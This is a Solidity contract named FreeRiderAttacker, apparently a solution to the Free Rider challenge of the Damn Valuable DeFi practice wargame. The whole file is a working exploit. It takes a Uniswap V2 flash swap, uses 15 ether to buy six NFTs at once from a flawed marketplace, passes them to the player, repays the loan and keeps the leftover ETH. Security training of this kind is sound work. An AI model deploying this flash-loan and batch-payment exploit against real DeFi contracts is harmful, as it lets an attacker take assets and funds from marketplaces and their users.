// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {WETH} from "solmate/src/tokens/WETH.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {console} from "hardhat/console.sol";
import {FreeRiderRecovery} from "./FreeRiderRecovery.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    WETH private weth;
    address private dvt;
    FreeRiderRecovery private recovery;
    FreeRiderNFTMarketplace private marketplace;
    DamnValuableNFT private nft;
    address private uniswapFactory;
    address private player;

    constructor(
        address _uniswapFactory,
        address _dvt,
        address _weth,
        address _recovery,
        address _marketplace,
        address _nft,
        address _player
    ) public {
        uniswapFactory = _uniswapFactory;
        dvt = _dvt;
        weth = WETH(payable(_weth));
        recovery = FreeRiderRecovery(_recovery);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        player = _player;
        nft = DamnValuableNFT(_nft);
    }

    function attack() public payable {
        bytes memory data = abi.encode(msg.sender);

        console.log("eth  balance : %s", address(this).balance);
        weth.deposit{value: address(this).balance}();
        console.log("weth balance : %s", weth.balanceOf(address(this)));
        address pair = IUniswapV2Factory(uniswapFactory).getPair(
            dvt,
            address(weth)
        );
        require(
            IUniswapV2Pair(pair).token0() == address(weth),
            "token0 is not weth"
        );
        require(IUniswapV2Pair(pair).token1() == dvt, "token1 is not dvt");

        console.log("IUniswapV2Pair.swap");
        IUniswapV2Pair(pair).swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external {
        console.log("uniswapV2Call");
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        require(
            IUniswapV2Pair(msg.sender).token0() == address(weth),
            "token0 is not weth"
        );
        assert(
            msg.sender ==
                IUniswapV2Factory(uniswapFactory).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair
        // rest of the function goes here!

        weth.withdraw(weth.balanceOf(address(this)));
        uint[] memory tokenIds = new uint[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: 15 ether}(tokenIds);

        console.log("nft balance : %s", nft.balanceOf(address(this)));
        nft.safeTransferFrom(address(this), player, 0);
        nft.safeTransferFrom(address(this), player, 1);
        nft.safeTransferFrom(address(this), player, 2);
        nft.safeTransferFrom(address(this), player, 3);
        nft.safeTransferFrom(address(this), player, 4);
        nft.safeTransferFrom(address(this), player, 5);
        console.log("nft balance : %s", nft.balanceOf(address(this)));

        // about 0.3% fee, +1 to round up
        uint fee = (amount0 * 3) / 997 + 1;
        uint amountToRepay = amount0 + fee;

        weth.deposit{value: amountToRepay}();
        console.log("amountToRepay: %s", amountToRepay);
        console.log("weth balance : %s", weth.balanceOf(address(this)));
        // Repay
        weth.transfer(msg.sender, amountToRepay);
        payable(player).transfer(address(this).balance);
    }

    receive() external payable {}

    fallback() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
